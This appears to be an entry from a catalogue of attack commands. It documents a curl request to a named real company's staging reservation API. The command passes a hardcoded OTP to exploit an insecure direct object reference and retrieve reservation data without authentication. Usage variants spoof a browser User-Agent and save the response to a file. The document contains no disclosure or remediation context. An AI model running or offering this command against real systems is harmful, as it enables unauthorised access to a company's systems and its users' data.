---
data: >-
  curl -X GET
  "https://reservation.stg.starbucks.com.cn/api/customer/reservation/history?otp=111111"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
tags:
  - web
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: eae2ce6e-c959-4adc-b689-caa245100c22
created_at: '2025-12-14T17:25:34.061Z'
updated_at: '2025-12-14T17:25:34.061Z'
verified: false
validated: true
submitted: true
---
# curl-api-request-with-otp

## Command

```bash
curl -X GET "https://reservation.stg.starbucks.com.cn/api/customer/reservation/history?otp=111111" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Description

This command uses curl to send a GET request to the vulnerable Starbucks China staging API endpoint, exploiting IDOR by providing a hardcoded OTP of '111111' to retrieve unauthorized test user reservation data without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL with `?otp=111111` | Target endpoint with the weak OTP parameter | Yes |
| `-H "User-Agent: ..."` | Sets a browser-like User-Agent header to mimic legitimate traffic | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://reservation.stg.starbucks.com.cn/api/customer/reservation/history?otp=111111"
```

### Advanced Usage

```bash
curl -X GET "https://reservation.stg.starbucks.com.cn/api/customer/reservation/history?otp=111111" -H "User-Agent: Mozilla/5.0" -o response.json
```

## Expected Output

A JSON response body containing an array of test reservation objects, e.g., {"reservations": [{"userId": "test123", "time": "2023-01-01T12:00:00Z", "status": "booked"}]}. If successful, no auth errors; otherwise, empty or 403 response.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-in-Reservation-API-with-Hardcoded-OTP]]
